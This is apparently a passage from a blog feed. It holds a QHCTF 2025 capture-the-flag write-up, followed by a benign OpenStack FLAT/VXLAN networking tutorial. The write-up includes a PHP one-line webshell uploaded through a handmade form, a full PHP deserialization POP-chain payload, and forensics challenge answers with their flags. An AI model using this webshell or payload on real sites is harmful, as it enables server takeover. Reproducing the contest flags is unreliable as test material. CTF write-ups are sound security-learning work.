class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_php</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;bad request&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$user_dir</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$user_dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$path</span>&quot;</span>, <span class="literal">true</span>, <span class="number">303</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>手写一个提交文件的网页</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;http://challenge.qihangcup.cn:35056/&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload File&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>action写自己的靶机地址,之后上传一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>自己可以构造一个phpinfo查看禁用的函数，这里只能通过assert伪造<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125215219.png"><br>编码器记得勾选base64,不然都是不能用的，必须用编码绕过。</p><h2 id="Web-IP"><a href="#Web-IP" class="headerlink" title="Web_IP"></a>Web_IP</h2><p>php的SSIT,直接构造一个查看flag的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125215336.png"></p><h2 id="Web-pop"><a href="#Web-pop" class="headerlink" title="Web_pop"></a>Web_pop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to QHCTF 2025, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="comment">// protected $func;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __destruct()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     echo &quot;Welcome to QHCTF 2025, &quot; . $this-&gt;name;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __isset($var)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     ($this-&gt;func)();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// private $obj;</span></span><br><span class="line">    <span class="comment">// private $var;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __toString()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;obj-&gt;check($this-&gt;var);</span></span><br><span class="line">    <span class="comment">//     return &quot;CTFers&quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __invoke()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     echo file_get_contents(&#x27;/flag&#x27;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __call($fun, $var)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;cla = clone $var[0];</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __clone()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if (isset($this-&gt;obj-&gt;cmd)) &#123;</span></span><br><span class="line">    <span class="comment">//         // echo &quot;success&quot;;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span>-&gt;func = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;obj = <span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;cla = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="keyword">var</span> = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;obj = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>即<code>O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;N;s:4:&quot;func&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:3:&quot;var&quot;;N;&#125;&#125;&#125;&#125;s:3:&quot;var&quot;;r:4;&#125;s:4:&quot;func&quot;;N;&#125;</code></p><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="关于动态取证"><a href="#关于动态取证" class="headerlink" title="关于动态取证"></a>关于动态取证</h2><p>流程是e01-&gt;FTK Image工具-&gt;转换raw-&gt;通过qume-img-&gt;转换vmware虚拟磁盘，导入虚机即可</p><h2 id="Win-01"><a href="#Win-01" class="headerlink" title="Win_01"></a>Win_01</h2><p>1.找出系统中蛤客的ip地址及端口，提交方式请以QHCTF{md5(127.0.0.1:80)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}</p><p>动态调试系统发现Server2.exe是被删除的，通过取证工具给他拖出来，就是在HackY$的开机启动目录<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125220908.png"><br>拖出来之后各种沙箱分析，最终在安恒的沙箱中出现了一个ip<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125221007.png"><br>flag即QHCTF{md5{192.168.20.1:8000}}即<code>QHCTF&#123;ad4fdee2eada36ec3c20e9d6311cf258&#125;</code></p><h2 id="Win-02"><a href="#Win-02" class="headerlink" title="Win_02"></a>Win_02</h2><p>2.蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码，提交方式请以QHCTF{md5(user_password)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}<br>参考文档<code>https://blog.51cto.com/u_16747374/12268420</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125221543.png"><br>获取账号密码hash，最红hash解密为123456即账flag<code>QHCTF&#123;md5(HackY$_123456)&#125;</code>即<code>QHCTF&#123;fb484ad326c0f3a4970d1352bfbafef8&#125;</code></p><h2 id="Win-04"><a href="#Win-04" class="headerlink" title="Win_04"></a>Win_04</h2><p>4.蛤客在系统数据库中藏了一些东西，请你找出其中的flag值<br>动态取证直接去cmd打开<code>regedit</code>就可以直接拿到flag，这是最快的方法，它默认退出的位置就是他设置flag的位置，也可以通过一个reg<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125222104.png"><br>文件获取，进去直接搜索QHCTF即可拿到flag<br><img src="https://image.boychai.xyz/article/9918f27c816ff00ba5c0179aea4a073.png"></p><h2 id="Win-05"><a href="#Win-05" class="headerlink" title="Win_05"></a>Win_05</h2><p>5.小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么，提交方式请以QHCTF{md5(xxxx_10_127.0.0.1)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}<br>在下载目录中Download中，有两个Todesk，去翻找它们的日志文件，也可以直接从去取证大师中直接拿到ip和时间<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125222258.png"><br>flag即<code>QHCTF&#123;md5(Todesk_781_223.104.132.99)</code><br>其中时间计算他这里是有误的，他这个时间计算是779，可能存在计算误差，挨个累加尝试到781成功即flag<code>QHCTF&#123;dca8df29e49e246c614100321e3b932e&#125;</code></p><h2 id="Win-07"><a href="#Win-07" class="headerlink" title="Win_07"></a>Win_07</h2><p>7.蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值<br>在HackY$的Desktop(桌面)中存放着<br><img src="https://image.boychai.xyz/article/c2e5c331548c422e68de5d448f4b9f6.png"><br>这个内容，通过执行命令<code>set</code>拿到环境变量，即密码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125221906.png"><br>拿到密码解密内容为即flag<code>QHCTF&#123;6143b46a-8e98-4356-a9b2-251a7ec19e51&#125;</code></p>]]></content>
    
    
    <summary type="html">解题情况

最终排名19，22道题目，20解，一道社工的你猜猜这是哪和取证的Win_06没解出来，题目质量并不高。其中逆向、密码均为wheeler大佬提供的wp，猿类的语言的wp为beginner大佬提供。

MISC
QHCTF For Year 2025
根据提示画图080714212829302316092230-04111825121306132027-0605041118252627-08091009162330-0102031516170108152229-0108142229-0203041617180209162330-0108152229303124171003-231609</summary>
    
    
    
    <category term="CTF相关" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/"/>
    
    <category term="WriteUp" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://blog.boychai.xyz/tags/CTF/"/>
    
    <category term="WriteUp" scheme="https://blog.boychai.xyz/tags/WriteUp/"/>
    
    <category term="WEB" scheme="https://blog.boychai.xyz/tags/WEB/"/>
    
    <category term="CRYPTO" scheme="https://blog.boychai.xyz/tags/CRYPTO/"/>
    
    <category term="MISC" scheme="https://blog.boychai.xyz/tags/MISC/"/>
    
    <category term="REVERSE" scheme="https://blog.boychai.xyz/tags/REVERSE/"/>
    
    <category term="PWN" scheme="https://blog.boychai.xyz/tags/PWN/"/>
    
    <category term="Forensics" scheme="https://blog.boychai.xyz/tags/Forensics/"/>
    
  </entry>
  
  <entry>
    <title>2024年终总结 - 希望这是一切的开始</title>
    <link href="https://blog.boychai.xyz/2025/01/24/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93%20-%20%E5%B8%8C%E6%9C%9B%E8%BF%99%E6%98%AF%E4%B8%80%E5%88%87%E7%9A%84%E5%BC%80%E5%A7%8B/"/>
    <id>https://blog.boychai.xyz/2025/01/24/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93%20-%20%E5%B8%8C%E6%9C%9B%E8%BF%99%E6%98%AF%E4%B8%80%E5%88%87%E7%9A%84%E5%BC%80%E5%A7%8B/</id>
    <published>2025-01-24T21:30:00.000Z</published>
    <updated>2025-07-17T05:40:18.597Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="密码错误（hash 不匹配）">  <script id="hbeData" type="hbeData" data-hmacdigest="28a85383da799c757e6a21faf775c5e6ae5463df108e9cd8c69071744eeccf71"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码访问</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">加密文章，请输入密码访问</summary>
    
    
    
    <category term="年终总结" scheme="https://blog.boychai.xyz/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="年终总结" scheme="https://blog.boychai.xyz/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack-网络-FLAT与VXLAN</title>
    <link href="https://blog.boychai.xyz/2025/01/22/OpenStack-%E7%BD%91%E7%BB%9C-FLAT%E4%B8%8EVXLAN/"/>
    <id>https://blog.boychai.xyz/2025/01/22/OpenStack-%E7%BD%91%E7%BB%9C-FLAT%E4%B8%8EVXLAN/</id>
    <published>2025-01-22T13:35:00.000Z</published>
    <updated>2025-07-17T05:40:18.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FLAT网络"><a href="#FLAT网络" class="headerlink" title="FLAT网络"></a>FLAT网络</h1><p>Flat网络，相当于直连到对应网络中，没有套任何一层，所有设备都在同一个广播域中。最开始搭建的供应商网络就是这种形式，直连到对应的一个网络中。这里将讲解如何增加一个Flat网络。<br>首先先在所有的网络计算节点添加一个网卡(注意搭建的时候控制节点也加上了网络控制节点，虽然不知道用处在哪，但是为了不出问题建议也加上。)<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250107194638.png"><br>这里添加了一个仅主机模式的网卡，一定是在所有计算节点都添加上。添加上之后开始设置网卡，增加后的网卡名字是ens36，执行下面命令进行配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# <span class="built_in">cd</span> /etc/sysconfig/network-scripts/</span><br><span class="line">[root@compute1 network-scripts]# <span class="built_in">cp</span> ifcfg-ens33 ifcfg-ens36</span><br><span class="line"><span class="comment"># 修改ens36的网卡，最终保留下面信息即可。</span></span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">NAME=ens36</span><br><span class="line">DEVICE=ens36</span><br><span class="line">ONBOOT=<span class="built_in">yes</span></span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">IPADDR=192.168.244.128</span><br></pre></td></tr></table></figure><p>IP的配置只需要保留ip和掩码即可，因为仅主机模式，本身就不可以连接外部网路所以也没必要加网关和DNS。其余主机也都是这样配置，ip设置成dhcp获取的动态ip即可，或者自己手写一个网段都行(请根据自己的网络环境设置)。<br>下面开始配置控制节点的<code>neutron</code>,编辑文件<code>/etc/neutron/plugins/ml2/ml2_conf.ini</code>,修改配置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 修改</span><br><span class="line">flat_networks = provider</span><br><span class="line"># 为</span><br><span class="line">flat_networks = provider,net_vmnet1</span><br></pre></td></tr></table></figure><p>此时去所有的网络计算节点<code>/etc/neutron/plugins/ml2/linuxbridge_agent.ini</code>,修改配置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># linux_bridge 段下</span><br><span class="line">physical_interface_mappings = provider:ens33</span><br><span class="line"># 修改为</span><br><span class="line">physical_interface_mappings = provider:ens33,net_vmnet1:ens36</span><br></pre></td></tr></table></figure><p>修改好之后在网络控制节点执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart neutron-server neutron-dhcp-agent neutron-metadata-agent neutron-linuxbridge-agent</span><br></pre></td></tr></table></figure><p>在网络的计算节点执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart neutron-linuxbridge-agent</span><br></pre></td></tr></table></figure><p>此时flat网络已经配置好了，下面开始创建网络，创建网络的形式可以和最开始搭建集群的时候采用的命令形式，这里采用仪表的形式去创建网络，在仪表的<code>管理员-》网络-》网络</code>中创建网络<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250107202709.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250107202749.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250107202904.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250107202940.png"><br>此时再去创建实例测试一下是否连通<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250107203055.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250107203335.png"><br>发现是可以的，这就说明已经通了。</p><h1 id="VXLAN网络与VPC"><a href="#VXLAN网络与VPC" class="headerlink" title="VXLAN网络与VPC"></a>VXLAN网络与VPC</h1><p>VXLAN是VLAN的扩展，VLAN与VXLAN的区别这里不多描述，FLAT是没有套任何一层网络与外部网络直连，VXLAN是三层网络，在openstack中相当于多套了一层可以实现网络的隔离更加安全。在配置之前需要继续添加一个网卡，这里采用lan区段的方式增加，所有网络计算节点都要添加，如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108133754.png"><br>此时机器中多了一个ens37的网卡，下面开始配置ens37的网络配置，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cd</span> /etc/sysconfig/network-scripts/</span><br><span class="line">[root@controller network-scripts]# <span class="built_in">cp</span> ifcfg-ens36 ifcfg-ens37</span><br><span class="line"><span class="comment"># 修改成下面内容</span></span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">NAME=ens37</span><br><span class="line">DEVICE=ens37</span><br><span class="line">ONBOOT=<span class="built_in">yes</span></span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">IPADDR=172.16.0.11</span><br></pre></td></tr></table></figure><p>网卡都添加好后开始配置vxlan，具体可以参考文档</p><ul><li><a href="https://docs.openstack.org/neutron/stein/install/">https://docs.openstack.org/neutron/stein/install/</a></li><li><a href="https://docs.openstack.org/neutron/stein/install/install-rdo.html">https://docs.openstack.org/neutron/stein/install/install-rdo.html</a></li><li><a href="https://docs.openstack.org/neutron/stein/install/controller-install-rdo.html">https://docs.openstack.org/neutron/stein/install/controller-install-rdo.html</a></li><li><a href="https://docs.openstack.org/neutron/stein/install/controller-install-option2-rdo.html">https://docs.openstack.org/neutron/stein/install/controller-install-option2-rdo.html</a></li><li><a href="https://docs.openstack.org/neutron/stein/install/compute-install-rdo.html">https://docs.openstack.org/neutron/stein/install/compute-install-rdo.html</a><br>使用vxlan之前需要把供应商网络提前装好这个要注意，下面开始安装软件包，不出意外这些应该是安装好的。下面是在neutron控制网络节点配置的</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install openstack-neutron openstack-neutron-ml2 \</span><br><span class="line">  openstack-neutron-linuxbridge 